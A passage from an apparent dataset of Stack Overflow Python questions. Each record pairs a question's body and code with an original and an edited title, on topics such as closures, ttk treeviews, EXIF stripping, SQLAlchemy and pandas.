0x7fff8c522000 - 0x7fff8c5abff7 libsystem_c.dylib (997.1.1) <61833FAA-7281-3FF9-937F-686B6F20427C> /usr/lib/system/libsystem_c.dylib 0x7fff8ccbe000 - 0x7fff8ccedfd2 libsystem_m.dylib (3047.16) <B7F0E2E4-2777-33FC-A787-D6430B630D54> /usr/lib/system/libsystem_m.dylib 0x7fff8ce7c000 - 0x7fff8ce83fff libcompiler_rt.dylib (35) <4CD916B2-1B17-362A-B403-EF24A1DAC141> /usr/lib/system/libcompiler_rt.dylib 0x7fff8ce87000 - 0x7fff8ce88fff libunc.dylib (28) <62682455-1862-36FE-8A04-7A6B91256438> /usr/lib/system/libunc.dylib 0x7fff8ce89000 - 0x7fff8d06eff7 com.apple.CoreFoundation (6.9 - 855.11) <E22C6A1F-8996-349C-905E-96C3BBE07C2F> /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation 0x7fff8d81e000 - 0x7fff8d81fff7 libsystem_sandbox.dylib (278.10) <A47E7E11-3C76-318E-B67D-98972B86F094> /usr/lib/system/libsystem_sandbox.dylib 0x7fff8d876000 - 0x7fff8d87aff7 libcache.dylib (62) <BDC1E65B-72A1-3DA3-A57C-B23159CAAD0B> /usr/lib/system/libcache.dylib 0x7fff8d905000 - 0x7fff8d9e4fff libcrypto.0.9.8.dylib (50) <B95B9DBA-39D3-3EEF-AF43-44608B28894E> /usr/lib/libcrypto.0.9.8.dylib 0x7fff8dc58000 - 0x7fff8dc7fffb libsystem_info.dylib (449.1.3) <7D41A156-D285-3849-A2C3-C04ADE797D98> /usr/lib/system/libsystem_info.dylib 0x7fff8dd1b000 - 0x7fff8dec8f27 libobjc.A.dylib (551.1) <AD7FD984-271E-30F4-A361-6B20319EC73B> /usr/lib/libobjc.A.dylib 0x7fff8dec9000 - 0x7fff8df2cff7 com.apple.SystemConfiguration (1.13 - 1.13) <F05F4149-981B-380B-8F50-51CE804BBB89> /System/Library/Frameworks/SystemConfiguration.framework/Versions/A/SystemConfiguration 0x7fff8e008000 - 0x7fff8e019ff7 libsystem_asl.dylib (217.1.4) <655FB343-52CF-3E2F-B14D-BEBF5AAEF94D> /usr/lib/system/libsystem_asl.dylib 0x7fff8e461000 - 0x7fff8e488ff7 libsystem_network.dylib (241.3) <8B1E1F1D-A5CC-3BAE-8B1E-ABC84337A364> /usr/lib/system/libsystem_network.dylib 0x7fff8e508000 - 0x7fff8e50fff7 libsystem_pthread.dylib (53.1.4) <AB498556-B555-310E-9041-F67EC9E00E2C> /usr/lib/system/libsystem_pthread.dylib 0x7fff8e58d000 - 0x7fff8e596ff3 libsystem_notify.dylib (121) <52571EC3-6894-37E4-946E-064B021ED44E> /usr/lib/system/libsystem_notify.dylib 0x7fff8ec87000 - 0x7fff8ecabfff libxpc.dylib (300.1.17) <4554927A-9467-365C-91F1-5A116989DD7F> /usr/lib/system/libxpc.dylib 0x7fff8fe32000 - 0x7fff8fe4cfff libdispatch.dylib (339.1.9) <46878A5B-4248-3057-962C-6D4A235EEF31> /usr/lib/system/libdispatch.dylib 0x7fff90580000 - 0x7fff905a9ff7 libc++abi.dylib (48) <8C16158F-CBF8-3BD7-BEF4-022704B2A326> /usr/lib/libc++abi.dylib 0x7fff905aa000 - 0x7fff90762ff3 libicucore.A.dylib (511.25) <3ED7B656-416E-3071-AEC8-E85C90232F78> /usr/lib/libicucore.A.dylib 0x7fff90c0c000 - 0x7fff90c0dffb libremovefile.dylib (33) <3543F917-928E-3DB2-A2F4-7AB73B4970EF> /usr/lib/system/libremovefile.dylib 0x7fff90c0e000 - 0x7fff90c1efff libbsm.0.dylib (33) <2CAC00A2-1352-302A-88FA-C567D4D69179> /usr/lib/libbsm.0.dylib 0x7fff91c8b000 - 0x7fff91c8dff3 libsystem_configuration.dylib (596.12) <C4F633D9-94C8-35D9-BB2D-84C5122533C7> /usr/lib/system/libsystem_configuration.dylib 0x7fff91e16000 - 0x7fff91e1bfff libmacho.dylib (845) <1D2910DF-C036-3A82-A3FD-44FF73B5FF9B> /usr/lib/system/libmacho.dylib 0x7fff920a5000 - 0x7fff920d5fff libncurses.5.4.dylib (42) <BF763D62-9149-37CB-B1D2-F66A2510E6DD> /usr/lib/libncurses.5.4.dylib 0x7fff923d7000 - 0x7fff923f2ff7 libsystem_malloc.dylib (23.1.10) <FFE5C472-B23A-318A-85BF-77CDE61900D1> /usr/lib/system/libsystem_malloc.dylib 0x7fff93322000 - 0x7fff9333eff7 libsystem_kernel.dylib (2422.1.72) <D14913DB-47F1-3591-8DAF-D4B4EF5F8818> /usr/lib/system/libsystem_kernel.dylib 0x7fff941e6000 - 0x7fff941e7ff7 libSystem.B.dylib (1197.1.1) <BFC0DC97-46C6-3BE0-9983-54A98734897A> /usr/lib/libSystem.B.dylib 0x7fff94239000 - 0x7fff94287fff libcorecrypto.dylib (161.1) <F3973C28-14B6-3006-BB2B-00DD7F09ABC7> /usr/lib/system/libcorecrypto.dylib 0x7fff94588000 - 0x7fff945bcfff libssl.0.9.8.dylib (50) <B15F967C-B002-36C2-9621-3456D8509F50> /usr/lib/libssl.0.9.8.dylibExternal Modification Summary: Calls made by other processes targeting this process: task_for_pid: 0 thread_create: 0 thread_set_state: 0 Calls made by this process: task_for_pid: 0 thread_create: 0 thread_set_state: 0 Calls made by all processes on this machine: task_for_pid: 991820 thread_create: 1 thread_set_state: 0VM Region Summary:ReadOnly portion of Libraries: Total=80.5M resident=22.0M(27%) swapped_out_or_unallocated=58.5M(73%)Writable regions: Total=61.0M written=15.9M(26%) resident=22.2M(36%) swapped_out=0K(0%) unallocated=38.8M(64%)REGION TYPE VIRTUAL=========== =======Kernel Alloc Once 4KMALLOC 52.5MMALLOC (admin) 16KSTACK GUARD 56.0MStack 8192KVM_ALLOCATE 12K__DATA 2024K__LINKEDIT 66.4M__TEXT 14.1M__UNICODE 544Kshared memory 4K=========== =======TOTAL 199.6M",Python segmentation error working in shell - Mavericks readline.so bug
Python: How to use variables acros modules," I'm trying to figure out how to use variables and setups across modules.Am I right when I think it's smart to keep separate functions of a program in separate modules?I have a main program module called main.py and in it I have this: I then import a module (in that module I have a function called Relay)and try to use the function with module1.Relay(1,1)But the function in module1 needs the GPIO from the main.py to Work. How do I go about with this?I really don't want the GPIO setting part in the module1, I don't want it to be run every time I run the module1.Relay(1,1) call..What is best practice for working across modules? (I'm making a controller for my home's heat system.) <code>  # Sets GPIO's to HIGH = Relays OFFtry: import RPi.GPIO as GPIOexcept RuntimeError: Print(""Error importing RPi.GPIO!!"")GPIO.setmode(GPIO.BOARD)GPIO.setwarnings(False)# GPIO16 is relay1GPIO.setup(16, GPIO.OUT, initial=GPIO.HIGH)# GPIO11 is relay2GPIO.setup(11, GPIO.OUT, initial=GPIO.HIGH)",Python: How to use variables across modules
Change the colour of just a column in my ttk treeview - python," I am doing a chat client using a treeview with multiple columns in Python.This is the code for the treeview: And I add items like this: Now, that works perfectly (here's a screenshot as an example): but that last line of code changes the colour of all 3 columns in that row. What I want is to change only the colour of the text of the #2 column (just the message) and not the entire row (not Nick or Time columns). I tried for a long time now but it's 4 AM and I surrender Is there any way to do it? Updating 2 weeks laterNow I tried to do 3 different treeviews (1 column each) and it ends up this way:Although that fix the colour issue, i have a new issue: The scrollbar. It's there a way to bound a scrollbar to 3 different treeviews? all my attemps had failed so far and i can move only one of the treeview with a scrollbar. It's possible to bound to 3 treeviews? (If yes: how?, worth?, should i?) And also another problem: all attempts to remove treeview border have failed in TTK python.Another problem is that now the Mensaje treeview only displays the first word. No idea why neither :\ this is the new code about the first word issue. And this goes on message: <code>  chat = ttk.Treeview(height=""26"", columns=(""Nick"",""Mensaje"",""Hora""), selectmode=""extended"")chat.heading('#1', text='Nick', anchor=W)chat.heading('#2', text='Mensaje', anchor=W)chat.heading('#3', text='Hora', anchor=W)chat.column('#1', stretch=NO, minwidth=0, width=130)chat.column('#2', stretch=NO, minwidth=0, width=620)chat.column('#3', stretch=NO, minwidth=0, width=65)chat.column('#0', stretch=NO, minwidth=0, width=0) #width 0 to not display it chat.insert("""", ""end"", """", values=((user, message, time)), tags=(messageid))chat.tag_configure(messageid, foreground='#ff0000') chat2 = ttk.Treeview(height=""28"", columns=""Mensaje"", selectmode=""extended"")chat2.heading('#1', text='Mensaje', anchor=CENTER)chat2.column('#1', stretch=NO, minwidth=400, width=620)chat2.column('#0', stretch=NO, minwidth=0, width=0) BotGUI.chat2.insert("""", ""end"", iid=(idmensajeactual), values=mensaje, tags=(messageid))try: BotGUI.chat2.tag_configure(messageid, foreground='#'+colorfuente) #tflexcept TclError: print(""[Error02] - can't assign colour of ""+ usuario +""."")",3 Different issues with ttk treeviews in python
"Weird lambda behaviour in loops in python 2.7, anybody has a clue?"," I stumbled upon a behaviour in python that I have a hard time understanding. This is the proof-of-concept code: The output of the above is: The behaviour of loop_one is surprising to me as I would expect it to behave as loop_two:el is an immutable value (a string) that changes at each loop, but lambda seems to store a pointer to the ""looping variable"", like if the loop would recycle the same memory address for each element of the sequence.The above behaviour is the same with full-blown functions with a for loop in them (so it is not a list-comprehension syntax).But wait: there is more... and more puzzling!The following script works like loop_one: (output: ['bar', 'bar'])But watch what happens when one substitute the variable name foo with a: (output: [<function <lambda> at 0x25cce60>, <function <lambda> at 0x25cced8>])Any idea of what is happening here? I suspect there must be some gotcha related to the underlying C implementation of my interpreter, but I haven't anything else (Jthon, PyPy or similar) to test if this behaviour is consistent across different implementations. <code>  from functools import partialif __name__ == '__main__': sequence = ['foo', 'bar', 'spam'] loop_one = lambda seq: [lambda: el for el in seq] no_op = lambda x: x loop_two = lambda seq: [partial(no_op, el) for el in seq] for func in (loop_one, loop_two): print [f() for f in func(sequence)] ['spam', 'spam', 'spam']['foo', 'bar', 'spam'] b = []for foo in (""foo"", ""bar""): b.append(lambda: foo)print [a() for a in b] b = []for a in (""foo"", ""bar""): b.append(lambda: a)print [a() for a in b]",Weird lambda behaviour in loops
Python: Remove exif info from images," In order to reduce the size of images to be used in a website, I reduced the quality to 80-85%. This decreases the image size quite a bit, up to an extent.To reduce the size further without compromising the quality, my friend pointed out that raw images from cameras have a lot of metadata called Exif info. Since there is no need to retain this Exif info for images in a website, we can remove it. This will further reduce the size by 3-10 kB.But I'm not able to find an appropriate library to do this in my Python code. I have browsed through related questions and tried out some of the methods:Original image: http://mdb.ibcdn.com/8snmhp4sjd75vdr27gbadolc003i.jpgMogrify Result: http://s23.postimg.org/aeaw5x7ez/8snmhp4sjd75vdr27gbadolc003i_mogrify.jpg This method reduces the size from 105 kB to 99.6 kB, but also changed the color quality.Exif-tool Result: http://s22.postimg.org/aiq99o775/8snmhp4sjd75vdr27gbadolc003i_exiftool.jpgThis method reduces the size from 105 kB to 72.7 kB, but also changed the color quality.This answer explains in detail how to manipulate the Exif info, but how do I use it to remove the info?Can anyone please help me remove all the extra metadata without changing the colours, dimensions, and other properties of an image? <code>  /usr/local/bin/mogrify -strip filename exiftool -all= filename",Python: Remove Exif info from images
Coderunner uses old 2.71 version of Python instead of 3.2 on OSX 10.7.5," I am trying to use the newer version of Python but when I type: I get back: In the terminal when I enter python I get: When I enter python3 I get: As you see, I have installed Python 3.3 but no matter what I do I can't seem to actually use it in CodeRunner. <code>  import sys print sys.version_info sys.version_info(major=2, minor=7, micro=1, releaselevel='final', serial=0) Python 2.7.1 (r271:86832, Jun 16 2011, 16:59:05) [GCC 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2335.15.00)] on darwin Python 3.3.2 (v3.3.2:d047928ae3f6, May 13 2013, 13:52:24) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin",Why is Code Runner using the old 2.71 version of Python instead of 3.x on OSX?
Python - how to create subclass or call method from parent class with kwargs," I have the following parent class with kwargs init: I want to create an object of 'class A' and call the 'connect' method. How do I go about? I tried the following and it wouldn't run (fyi - I'm a Python newbie): <code>  class A(object): """""" Parent class """""" def __init__(self, **kwargs): # connect parameters self.host = kwargs.get('host', 'localhost') self.user = kwargs.get('user', None) self.password = kwargs.get('password', None) def connect(self): try: self.ConnectWithCred( self.host, self.port, self.user, self.password) except pythoncom.com_error as error: e = format_com_message(""Failed to connect"") raise Error(e) sub_B = A(self.host = 'example.com', self.port = 22, self.user = 'root', self.password = 'testing')sub_B.connect()",Python - how to create object or call method from class with kwargs
Java/Python - The equation -e**-((-log(7)/100.0)*(100-x))+7 returns NaN," I'm trying to implement this curve as part of the leveling system of a small game I'm currently working on. The equation is as follows Which in python can be defined as Running this function in the Python console returns the values expected. I ported it over to Java, where it takes the form of: However, mysteriously, this always returns NaN. I've never encountered this problem before, what is going on? <code>  f(x) = -e^-((-log(7)/100)*(100-x))+7 f=lambda x:-e**-((-log(7)/100.0)*(100-x))+7 public static double f(float x) { return (Math.pow(-Math.E, -((-Math.log(7)/100)*(100-x)))+7);}",The equation -e**-((-log(7)/100.0)*(100-x))+7 returns NaN
Getting a parents children thru a backref attribute via sqlalchemy relationship causes unnecassary flush," I have a sqlalchemy relationship like this (trimmed for simplicity): While working while my objects i do: So far so good.But prior to committing when I do the following I get a DB flush: Can this be avoided by changing how I define the backref/relationship? <code>  class Parent(Base): __tablename__ = 'Parent' name = Column(String, nullable=False) def __init__(self, name) self.name = nameclass Child(Base): __tablename__ = 'Child' name = Column(String, nullable=False) parent = relationship(Parent, backref=backref('children') def __init__(self, name, parent) self.name = name self.parent = parent parent = Parent(""my parent"")db_session.add(parent) # must be done for other reasons not relevant to the issue.child = Child(""my child"", parent) children = parent.children # using the backref causes a flush",Getting a parents children through a backref attribute via sqlalchemy relationship causes unnecessary flush
how does iter() work?," What is the problem with this code? It returns Why does callable(list) return True but callable(l) does not?EDITWhat method should be preferred here:manual breakshundred others <code>  l = [1,2,3,4,5,6]for val in iter(l, 4): print (val) TypeError: iter(v, w): v must be callable","How does iter() work, it's giving ""TypeError: iter(v, w): v must be callable"""
"Why are Python and Ruby so slow, while Lisp implementations are fast?"," I find that simple things like function calls and loops, and even just loops incrementing a counter take far more time in Python and Ruby than in Chicken Scheme, Racket, or SBCL.Why is this so? I often hear people say that slowness is a price you pay for dynamic languages, but Lisps are very dynamic and are not ridiculously slow (they are usually less than 5 times slower than C; Ruby and Python can go into the double digits). Besides, Lisp style uses recursion, and not always tail recursion, a lot, the stack is a linked list of continuations in the heap, etc, which seem to be things that should make Lisp slower than the imperative-style Python and Ruby.Racket and SBCL are JITted, but Chicken Scheme is either statically compiled, or uses a non-optimizing interpreter, both of which should be badly suited to dynamic languages and slow. Yet even using the naive csi interpreter for Chicken Scheme (which doesn't even do bytecode compilation!), I get speeds far beyond Python and Ruby.Why exactly are Python and Ruby so ridiculously slow compared to the similarly dynamic Lisps? Is it because they are object oriented and need huge vtables and type heirarchies?Example: factorial function. Python: Racket: Timing results: <code>  def factorial(n): if n == 0: return 1 else: return n*factorial(n-1)for x in xrange(10000000): i = factorial(10) #lang racket(define (factorial n) (cond [(zero? n) 1] [else (* n (factorial (sub1 n)))]))(define q 0)(for ([i 10000000]) (set! q (factorial 10))) ithisa@miyasa /scratch> time racket factorial.rktracket factorial.rkt 1.00s user 0.03s system 99% cpu 1.032 totalithisa@miyasa /scratch> time python factorial.pypython factorial.py 13.66s user 0.01s system 100% cpu 13.653 total","Consider some basic logic implementation, why are Python and Ruby so slow, while Lisp versions faster?"
When to use the matplotlib.pyplot class and when the plot object (matplotlib.collections.PathCollection)," I wondered what the logic is behind the question when to use the plot instance (which is a PathCollection) and when to use the plot class itself. brings up a scatter plot. To make it work, I have to say: and to configure axes labels or limits, you write: and so on.But on the other hand, you write: What is the logic behind this? Can I look it up somewhere? Unfortunately, I haven't found an answer to this particular question in the documentation.When do you use the actual instance p for configuration of your graph and when do you use the pyplot class plt? <code>  import matplotlib.pyplot as pltp = plt.scatter([1,2,3],[1,2,3]) plt.annotate(...) plt.xlim(...)plt.xlabel(...) p.axes.set_aspect(...)p.axes.yaxis.set_major_locator(...)",When to use the matplotlib.pyplot class and when to use the plot object (matplotlib.collections.PathCollection)
Monitoring Java appliction with Python," I'm a python programmer, and want to monitor a Java application,by communicating with JMX.I've been searching the web and I haven't found a proved solution.I've looked at jmx4python and JPype but I haven't maid up my mind about them.Py4J doesn't look useful.Does anyone have a suggestion of a Framework or a way to do this?btw - The application is already running and I don't want to invoke it <code> ",Monitoring Java application with Python
Is there a way to do this Series.map in place?," The scenario here is that I've got a dataframe df with raw integer data, and a dict map_array which maps those ints to string values.I need to replace the values in the dataframe with the corresponding values from the map, but keep the original value if the it doesn't map to anything.So far, the only way I've been able to figure out how to do what I want is by using a temporary column. However, with the size of data that I'm working with, this could sometimes get a little bit hairy. And so, I was wondering if there was some trick to do this in pandas without needing the temp column... <code>  import pandas as pdimport numpy as npdf = pd.DataFrame(np.random.randint(1,5, size=(100,1)))map_array = {1:'one', 2:'two', 4:'four'}df['__temp__'] = df[0].map(map_array, na_action=None) #I've tried varying the na_action arg to no effectnan_index = data['__temp__'][df['__temp__'].isnull() == True].indexdf['__temp__'].ix[nan_index] = df[0].ix[nan_index]df[0] = df['__temp__']df = df.drop(['__temp__'], axis=1)","Is there a way to do a Series.map in place, but keep original value if no match?"
"Interactive Python: cannot get %lprun to work, although line_profiler is imported properly"," ProblemMost iPython ""magic functions"" work fine for me right off the bat: %hist, %time, %prun, etc. However, I noticed that %lprun could not be found with iPython as I'd installed it originally.Attempt to ResolveI then discovered that I should install the line_profiler module. I have installed this module, but still cannot seem to get the magic function to work correctly. If I attempt to call %lprun, iPython still cannot find the function. If I call it with the full name ( line_profiler.magic_lprun ), the function can be found, but I cannot get it to work at all. Below is an example of what I'd done (which is taken step by step from ""Python for Data Analysis"" book):Success Using %prun[In:] With this I get a nice answer, as expected:[Out:] And I can do the profiling magic function %prun:[In:] [Out:] Fail Using %lprunBut when I try %lprun, I cannot get anything:[In:] [Out:] And if I try to call the function with its standard name, it also does not work:[In:] [Out:] But the library has been imported properly, or at least this is what it says:[In:] [Out:] [In:] [Out:] It seems as if there is something extra that I am supposed to configure so that these new magic functions that I add can be identified as such. I could not find anything via a web search.I am running Spyder as an IDE (still using iPython as the console), but I have also tried it directly with iPython and with iPython notebook. I have had no luck in any format. <code>  def add_and_sum(x, y): added = x + y summed = added.sum(axis=1) return summedx = randn(3000, 3000)y = randn(3000, 3000)add_and_sum(x, y) array([-23.6223074 , -10.08590736, -31.2957222 , ..., -14.17271747, 63.84057725, -50.28469621]) %prun add_and_sum(x, y) 6 function calls in 0.042 secondsOrdered by: internal timencalls tottime percall cumtime percall filename:lineno(function) 1 0.020 0.020 0.029 0.029 <ipython-input-27-19f64f63ba0a>:1(add_and_sum) 1 0.013 0.013 0.042 0.042 <string>:1(<module>) 1 0.009 0.009 0.009 0.009 {method 'reduce' of 'numpy.ufunc' objects} 1 0.000 0.000 0.009 0.009 _methods.py:16(_sum) 1 0.000 0.000 0.009 0.009 {method 'sum' of 'numpy.ndarray' objects} 1 0.000 0.000 0.000 0.000 {method 'disable' of '_lsprof.Profiler' objects} %lprun -f add_and_sum add_and_sum(x, y) ERROR: Line magic function `%lprun` not found. line_profiler.magic_lprun -f add_and_sum.test test.add_and_sum(x, y) line_profiler.magic_lprun -f add_and_sum.test test.add_and_sum(x, y) ^SyntaxError: invalid syntax line_profiler <module 'line_profiler' from '/Users/<edit>/anaconda/lib/python2.7/site-packages/line_profiler-1.0b3-py2.7-macosx-10.5-x86_64.egg/line_profiler.pyc'> line_profiler.magic_lprun <function line_profiler.magic_lprun>","Interactive Python: cannot get `%lprun` to work, although line_profiler is imported properly"
Select entry from array given another value - Python," I have a text file with the format (date, time, resistance): I need to extract the value of resistance (third column) from every 6 seconds after the first data entry. To start I wanted to import the text file using: However before I've hardly begun my program, I get the error: ValueError: invalid literal for float(): 12/11/2013-ALSO-I am not sure how to also iterate through time given that the date changes as it's an over-night data run. Elegant solutions to my problem(s) would be much appreciated.  <code>  12/11/2013 13:20:38 28.321930E+3... ... ... date, time, resistance = loadtxt('Thermometers.txt', unpack=True, usecols=[0,1,2])",Select entry from array given another value
scikit .predict() default threshold," I'm working on a classification problem with unbalanced classes (5% 1's). I want to predict the class, not the probability.In a binary classification problem, is scikit's classifier.predict() using 0.5 by default?If it doesn't, what's the default method? If it does, how do I change it?In scikit some classifiers have the class_weight='auto' option, but not all do. With class_weight='auto', would .predict() use the actual population proportion as a threshold?What would be the way to do this in a classifier like MultinomialNB that doesn't support class_weight? Other than using predict_proba() and then calculation the classes myself. <code> ",scikit-learn .predict() default threshold
Python function for rotating 2d objects," Is it possible to write a function in python that could rotate any 2d structure with the arguments being only the coordinates (x,y) of the points in the structure? Additional arguments would be included for axis, speed and direction. To my understanding it would only be possible by calculating point distance from symmetrical points and the axis and therefore it would always vary and is thus impossible except for 2d structures made up of standard shapes (triangles, rectangles, squares etc)Good examples would be appreciated. <code> ",Function for rotating 2d objects?
Python: for loop - print on the same line," I have a question about printing on the same line using for loop in Python 3. I searched for the answer but I couldn't find any relevant.So, I have something like this: When a user types in 'A short sentence', the function should do something with it and it should be printed on the same line.Let's say that function adds 't' to the end of each word, so the output should be However, at the moment the output is: How can I print the result on the same line easily? Or should I make a new string so and it is iterated and at the end I print new_string? <code>  def function(s): return s + 't'item = input('Enter a sentence: ')while item != '': split = item.split() for word in split: new_item = function(word) print(new_item) item = input('Enter a sentence: ') At shortt sentencet Atshorttsentencet new_string = ''new_string = new_string + new_item",Python: for loop - print on the same line
pandas - reading multiple JSON records into dataframe," I'd like to know if there is a memory efficient way of reading multi record JSON file ( each line is a JSON dict) into a pandas dataframe. Below is a 2 line example with working solution, I need it for potentially very large number of records. Example use would be to process output from Hadoop Pig JSonStorage function. <code>  import jsonimport pandas as pdtest='''{""a"":1,""b"":2}{""a"":3,""b"":4}'''#df=pd.read_json(test,orient='records') doesn't work, expects []l=[ json.loads(l) for l in test.splitlines()]df=pd.DataFrame(l)",Reading multiple JSON records into a Pandas dataframe
Python 3.3.2 Exception Invalid Syntax," I'm trying to write a simple exception handling. However it seems I'm doing something wrong. <code>  def average(): TOTAL_VALUE = 0 FILE = open(""Numbers.txt"", 'r') for line in FILE: AMOUNT = float(line) TOTAL_VALUE += AMOUNT NUMBERS_AVERAGE = TOTAL_VALUE / AMOUNT print(""the average of the numbers in 'Numbers.txt' is :"", format(NUMBERS_AVERAGE, '.2f')) FILE.close() except ValueError,IOError as err: print(err)average()> line 14> except ValueError as err:> ^> SyntaxError: invalid syntax",How to fix invalid syntax error at 'except ValueError'?
What does the .pop attribute of the session object do in Python?," I'm working through the Flask tutorial and would just like to clarify exactly what the .pop attr of the session object does and why it would take a 'None' parameter. <code>  @app.route('/logout')def logout(): session.pop('logged_in', None) flash('You were logged out') return redirect(url_for('show_entries'))",What does the second argument of the Session.pop method do in Python Flask?
Why does bool(XML_node) evaluate to False?," Why is an xml.etree.ElementTree.Element considered False? I know that I can do if e is not None to check for existence. But I would strongly expect bool(e) to return True. <code>  import xml.etree.ElementTree as ETe = ET.Element('Brock',Role=""Bodyguard"")print bool(e)",Why does bool(xml.etree.ElementTree.Element) evaluate to False?
python3 nested list comprehension scope," The best way to explain my question is with an example:example.py: When I run this under python 2 it works fine, but under python 3 I get a NameError for class B (but not class A): Why does only class B raise a NameError and why only under Python 3? <code>  class A(object): integers = [1, 2, 3] singles = [i for i in integers]class B(object): integers = [1, 2, 3] pairs = [(i, j) for i in integers for j in integers] $ python example.pyTraceback (most recent call last): File ""example.py"", line 6, in <module> class B(object): File ""example.py"", line 8, in B pairs = [(i, j) for i in integers for j in integers] File ""example.py"", line 8, in <listcomp> pairs = [(i, j) for i in integers for j in integers]NameError: global name 'integers' is not defined",Nested list comprehension scope
Django i18n: should each paragraph have its own {% blocktrans %} block?," I am just getting started with Django internationalization and trying to understand the best practices for using {% blocktrans %}. Is it preferable to use one {% blocktrans %} for each paragraph, or should I have one big {% blocktrans %} that contains many paragraphs? Having one big {% blocktrans %} is faster and makes my template look cleaner, but my concern is that:it causes HTML tags (like <p>...</p>) to become part of the translation stringIf I change one thing in one part of my huge block, the msgid would change, which seems like it could affect the other paragraphs. If I have smaller blocks, the changes would be more isolated (I suppose).If I make a formatting change like adding/removing a newline in between paragraphs, that would change the msgid.I am also wondering about formatting. Are there any complications to having line breaks inside a {% blocktrans %}? Or having leading spaces? e.g.: Any recommendations are welcome. <code>  {% blocktrans %} You have {{ num_messages }} messages. Another sentence.{% blocktrans %}",Django i18n: recommended size and formatting for {% blocktrans %} blocks?
ipynb import another ipynb file," Interactive Python (ipython) is simply amazing, especially as you are piecing things together on the fly... and does it in such a way that it is easy to go back.However, what seems to be interesting is the use-case of having multiple ipython notebooks (ipynb files). It apparently seems like a notebook is NOT supposed to have a relationship with other notebooks, which makes sense, except that I would love to import other ipynb files.The only workaround I see is converting my *.ipynb files into *.py files, which then can be imported into my notebook. Having one file hold everything in a project is a bit weird, especially if I want to really push for code-reuse (isn't that a core tenet of python?).Am I missing something? Is this not a supported use case of ipython notebooks? Is there another solution I can be using for this import of an ipynb file into another notebook? I'd love to continue to use ipynb, but it's really messing up my workflow right now :( <code> ",Importing an ipynb file from another ipynb file?
Pycharm and unittest does not work," I have a problem with PyCharm 3.0.1 I can't run basic unittests.Here is my code : Here is All the stuff PyCharm give meUnable to attach test reporter to test framework or test framework quit unexpectedlyIt also says And the event log : The problem is when I run manually the Python file (with PyCharm, as a script) Which is normal I make the test fail on purpose. I am a bit clueless on what is going on.here more information :Setting->Python Integrated Tools->Package requirements file: <PROJECT_HOME>/src/testDefault test runner: Unittestspyunit 1.4.1 Is installedEDIT: Same thing happen with the basic usage from unitests.py <code>  import unittest from MysqlServer import MysqlServerclass MysqlServerTest(unittest.TestCase): def setUp(self): self.mysqlServer = MysqlServer(""ip"", ""username"", ""password"", ""db"", port) def test_canConnect(self): self.mysqlServer.connect() self.fail()if __name__ == '__main__': unittest.main() AttributeError: class TestLoader has no attribute '__init__' 2:14:28 PM Empty test suite Ran 1 tests in 0.019sFAILED (failures=1) import unittestclass IntegerArithmenticTestCase(unittest.TestCase):def testAdd(self): ## test method names begin 'test*' self.assertEquals((1 + 2), 3) self.assertEquals(0 + 1, 1)def testMultiply(self): self.assertEquals((0 * 10), 0) self.assertEquals((5 * 8), 40)if __name__ == '__main__': unittest.main()",PyCharm and unittest won't run
Python: Find maximum length of all n-word-length substrings shared by two strings," I am working to produce a Python script that can find the (longest possible) length of all n-word-length substrings shared by two strings, disregarding trailing punctuation. Given two strings: ""this is a sample string"" ""this is also a sample string""I want the script to identify that these strings have a sequence of 2 words in common (""this is"") followed by a sequence of 3 words in common (""a sample string""). Here is my current approach: This script correctly outputs the (maximum) lengths of the common word-length substrings (2, 3), and has done so for all tests so far. My question is: Is there a pair of two strings for which the approach above will not work? More to the point: Are there extant Python libraries or well-known approaches that can be used to find the maximum length of all n-word-length substrings that two strings share? [This question is distinct from the longest common substring problem, which is only a special case of what I'm looking for (as I want to find all common substrings, not just the longest common substring). This SO post suggests that methods such as 1) cluster analysis, 2) edit distance routines, and 3) longest common sequence algorithms might be suitable approaches, but I didn't find any working solutions, and my problem is perhaps slightly easier that that mentioned in the link because I'm dealing with words bounded by whitespace.]EDIT:I'm starting a bounty on this question. In case it will help others, I wanted to clarify a few quick points. First, the helpful answer suggested below by @DhruvPathak does not find all maximally-long n-word-length substrings shared by two strings. For example, suppose the two strings we are analyzing are: ""They all are white a sheet of spotless paper when they first are born but they are to be scrawled upon and blotted by every goose quill""and ""You are all white, a sheet of lovely, spotless paper, when you first are born; but you are to be scrawled and blotted by every goose's quill""In this case, the list of maximally long n-word-length substrings (disregarding trailing punctuation) is: Using the following routine: One gets output: In the first place, I am not sure how one could select from this list the substrings that contain only whole words. In the second place, this list does not include ""are"", one of the desired maximally-long common n-word-length substrings. Is there a method that will find all of the maximally long n-word-long substrings shared by these two strings (""You are all..."" and ""They all are..."")? <code>  a = ""this is a sample string""b = ""this is also a sample string""aWords = a.split()bWords = b.split()#create counters to keep track of position in stringcurrentA = 0currentB = 0#create counter to keep track of longest sequence of matching wordsmatchStreak = 0#create a list that contains all of the matchstreaks foundmatchStreakList = []#create binary switch to control the use of while loopcontinueWhileLoop = 1for word in aWords: currentA += 1 if word == bWords[currentB]: matchStreak += 1 #to avoid index errors, check to make sure we can move forward one unit in the b string before doing so if currentB + 1 < len(bWords): currentB += 1 #in case we have two identical strings, check to see if we're at the end of string a. If we are, append value of match streak to list of match streaks if currentA == len(aWords): matchStreakList.append(matchStreak) elif word != bWords[currentB]: #because the streak is broken, check to see if the streak is >= 1. If it is, append the streak counter to out list of streaks and then reset the counter if matchStreak >= 1: matchStreakList.append(matchStreak) matchStreak = 0 while word != bWords[currentB]: #the two words don't match. If you can move b forward one word, do so, then check for another match if currentB + 1 < len(bWords): currentB += 1 #if you have advanced b all the way to the end of string b, then rewind to the beginning of string b and advance a, looking for more matches elif currentB + 1 == len(bWords): currentB = 0 break if word == bWords[currentB]: matchStreak += 1 #now that you have a match, check to see if you can advance b. If you can, do so. Else, rewind b to the beginning if currentB + 1 < len(bWords): currentB += 1 elif currentB + 1 == len(bWords): #we're at the end of string b. If we are also at the end of string a, check to see if the value of matchStreak >= 1. If so, add matchStreak to matchStreakList if currentA == len(aWords): matchStreakList.append(matchStreak) currentB = 0 breakprint matchStreakList allarewhite a sheet ofspotless paper whenfirst are born butare to be scrawledand blotted by every #import required packagesimport difflib#define function we'll use to identify matchesdef matches(first_string,second_string): s = difflib.SequenceMatcher(None, first_string,second_string) match = [first_string[i:i+n] for i, j, n in s.get_matching_blocks() if n > 0] return matcha = ""They all are white a sheet of spotless paper when they first are born but they are to be scrawled upon and blotted by every goose quill""b = ""You are all white, a sheet of lovely, spotless paper, when you first are born; but you are to be scrawled and blotted by every goose's 